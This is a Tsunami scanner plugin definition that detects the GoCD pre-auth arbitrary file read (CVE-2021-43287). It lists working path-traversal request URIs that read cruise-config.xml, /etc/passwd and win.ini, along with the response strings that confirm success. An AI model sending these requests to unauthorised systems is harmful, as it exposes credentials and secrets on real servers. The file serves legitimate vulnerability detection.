# proto-file: github.com/google/tsunami-security-scanner-plugins/templated/templateddetector/proto/templated_plugin.proto
# proto-message: TemplatedPlugin

###############
# PLUGIN INFO #
###############

info: {
  type: VULN_DETECTION
  name: "GoCD_CVE_2021_43287"
  author: "Google"
  version: "1.0"
}

finding: {
  main_id: {
    publisher: "TSUNAMI_COMMUNITY"
    value: "GoCD_ARBITRARY_FILE_READING"
  }
  severity: CRITICAL
  title: "GoCD Pre-Auth Arbitrary File Reading vulnerability"
  description:
    "ThoughtWorks GoCD versions 20.6.0 through 21.2.0 expose an unauthenticated API endpoint in"
    " the bundled Business Continuity add-on (/go/add-on/business-continuity/api/plugin) that"
    " fails to sanitize path traversal sequences in the pluginName and folderName query"
    " parameters. Unauthenticated remote attackers can read arbitrary files from the GoCD server"
    " filesystem, including cruise-config.xml containing agent auto-registration keys, webhook"
    " secrets, and encrypted pipeline credentials."
  recommendation: "Upgrade ThoughtWorks GoCD Server to version 21.3.0 or later."
  related_id: {
    publisher: "CVE"
    value: "CVE-2021-43287"
  }
}

config: {}

###########
# ACTIONS #
###########

actions: {
  name: "verify_business_continuity_file_read"
  http_request: {
    method: GET
    uri: [
      "/go/add-on/business-continuity/api/plugin?folderName=&pluginName=../../config/cruise-config.xml",
      "/add-on/business-continuity/api/plugin?folderName=&pluginName=../../config/cruise-config.xml",
      "/go/add-on/business-continuity/api/plugin?folderName=&pluginName=../../../../../../../../../../../../../../../../etc/go/cruise-config.xml",
      "/go/add-on/business-continuity/api/plugin?folderName=&pluginName=../../../../../../../../../../../../../../../../etc/passwd",
      "/add-on/business-continuity/api/plugin?folderName=&pluginName=../../../../../../../../../../../../../../../../etc/passwd",
      "/go/add-on/business-continuity/api/plugin?folderName=&pluginName=../../../../../../../../../../../../../../../../Windows/win.ini",
      "/add-on/business-continuity/api/plugin?folderName=&pluginName=../../../../../../../../../../../../../../../../Windows/win.ini"
    ]
    client_options: {
      disable_follow_redirects: true
    }
    response: {
      http_status: 200
      expect_any: {
        conditions: [
          { body: {} contains: "xsi:noNamespaceSchemaLocation=\"cruise-config.xsd\"" },
          { body: {} contains: "root:x:0:0:" },
          { body: {} contains: "root:*:0:0:" },
          { body: {} contains: "; for 16-bit app support" }
        ]
      }
    }
  }
}

#############
# WORKFLOWS #
#############

workflows: {
  actions: [
    "verify_business_continuity_file_read"
  ]
}
